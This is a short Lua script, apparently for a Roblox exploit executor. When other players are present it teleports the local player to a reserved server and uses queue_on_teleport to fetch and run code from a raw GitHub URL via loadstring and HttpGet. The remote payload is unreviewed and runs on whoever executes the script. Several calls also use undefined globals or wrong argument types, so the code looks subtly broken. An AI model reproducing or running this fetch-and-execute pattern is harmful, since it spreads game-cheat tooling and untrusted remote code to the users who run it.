function IsPlayers(count)
    local Players = game:GetService("Players")
    return #Players:GetPlayers() - 1 == count
end

if not IsPlayers(0) then
    local placeId = game.PlaceId
    local reservedServer = TeleportService:ReserveServer(placeId)
    game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, reservedServer, Players.LocalPlayer)
    queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/CookieScript/HappyModisTrashandLeakersAreRacistAndAnnoyingIHopeThisScriotWontGetLeakedAgainGrrrr/refs/heads/main/a/TpEzzz"))()]])
end
